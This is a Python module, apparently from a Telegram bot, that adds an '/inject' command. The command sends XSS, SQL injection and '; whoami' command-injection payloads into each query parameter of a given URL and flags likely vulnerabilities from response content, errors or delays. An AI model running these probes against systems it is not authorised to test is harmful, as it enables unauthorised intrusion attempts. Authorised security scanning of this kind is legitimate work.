import aiohttp
import asyncio
from telegram import Update
from telegram.ext import ContextTypes
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from config import is_authorized
from utils import require_auth
import time
from .log_utils import append_log_entry


PAYLOADS = {
    "xss": "<script>alert(1)</script>",
    "sqli_basic": "' OR '1'='1",
    "sqli_time": "' OR IF(1=1, SLEEP(5), 0)-- ",
    "cmd": "; whoami"
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " \
    "(KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
}

HTTP_TIMEOUT = 10


def normalize_url(raw_url: str) -> str:
    parsed = urlparse(raw_url)
    if not parsed.scheme:
        return 'http://' + raw_url
    return raw_url


async def test_payload(session, url: str, kind: str, key: str, payload: str):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    test_query = query.copy()
    test_query[key] = payload
    test_url = urlunparse(parsed._replace(query=urlencode(test_query, doseq=True)))
    
    try:
        start = time.monotonic()
        async with session.get(test_url, timeout=HTTP_TIMEOUT, headers=HEADERS) as resp:
            text = await resp.text()
            duration = time.monotonic() - start
            status = resp.status
            content_type = resp.headers.get("Content-Type", "")
            found_error = any(x in text.lower() for x in ["error", "sql", "syntax", "warning", "exception"])
            if kind == "sqli_time" and duration > 4:
                return f"[SQLI-TIME] ⚠️ Potenziale time-based SQLi rilevata su `{key}` con payload `{payload.strip()}`\n→ {test_url}\nTempo risposta: {duration:.2f}s"
            if status >= 500:
                return f"[{kind.upper()}] ⚠️ Server error {status} su `{key}` con payload `{payload}`\n→ {test_url}"
            if payload in text or found_error:
                return f"[{kind.upper()}] ⚠️ Potenziale vulnerabilità trovata su `{key}` con payload `{payload}`\n→ {test_url}"
            return None
        
    except asyncio.TimeoutError:
        return f"[{kind.upper()}] ⚠️ Timeout durante il test su `{key}` con payload `{payload}`\n→ {test_url}"
    
    except Exception as e:
        return f"[{kind.upper()}] Errore durante il test su `{key}` con payload `{payload}` → {str(e)}"


async def inject(url: str):    
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    
    if not query:
        return "❌ Nessun parametro da testare nella URL!"
    results = []
    
    async with aiohttp.ClientSession() as session:
        for kind, payload in PAYLOADS.items():
            for key in query:
                res = await test_payload(session, url, kind, key, payload)
                if res:
                    results.append(res)
                    
    if results:
        return "\n\n".join(results)
    return "✅ Nessuna vulnerabilità rilevata."


@require_auth()
async def inject_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Comando /inject lanciato")
    user = update.effective_user
    msg = update.effective_message
    
    if not context.args:
        await msg.reply_text("📌 Usa `/inject https://example.com/?id=1` per iniziare.")
        return
    
    url = normalize_url(context.args[0])
    await msg.reply_text("🚀 Avvio test injection...")
    result = await inject(url)
    
    await msg.reply_text(result[:4096])
    log_result = f"Injection test su URL: {url}\nRisultato:\n{result[:4096]}"
    append_log_entry("inject", user.id, user.username or "", url, log_result)
